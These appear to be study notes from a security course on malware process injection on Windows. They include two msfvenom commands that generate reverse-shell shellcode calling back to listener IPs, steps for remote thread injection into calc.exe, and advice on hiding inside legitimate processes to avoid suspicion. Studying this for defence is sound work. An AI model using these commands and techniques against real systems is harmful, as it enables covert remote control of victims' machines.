MALWARE INJECTION ATTACKS
- Refers to injecting malicious code into a running program.
- Difficult to detect as malware can piggyback on already-trusted
program.
- Install compiler for executables:
  kali@kali$ sudo apt install mingw-*


CODE INJECTION
- is  a simple way for one process (in this case malware)to add code to
another process that is running.
- We need the ability to hijack other legitimate processes.


EXAMPLE 1
- Classic method. Payload injection using the debugging API.
- Create a Payload:
    kali>  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.5 LPORT=4444 --arch x64 -f c


PROCESS HACKER
- Open Source tool that allows you to see what processes are operating on a 
device, as well as id programs consuming CPU resources and network connections
associated with a process.
- Obsereve the network tab to see our process


NOTE: A strange an unusual process that initiates a connection will immediately
raise suspicion; therefore, you must infiltrate a legitimate process.
- Inject our Payload to another legitimate process. in this case calc.exe 


CODE INJECTION- Thread Hijacking
- Attacker inserts malicious code directly into the target process's memory space.
- Remote thread Injection: a new thread is created within the target process to 
execute the malicious code.
1. Allocate memory within the target process and the buffer must be at least as
large as the Payload.
2. Copy your payload to the provided memory of the target process(calc.exe)
3. Ask the system to begin executing your payload in the target process(calc.exe)

Generate Shell Code
    kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.112 LPORT=8443 -f c 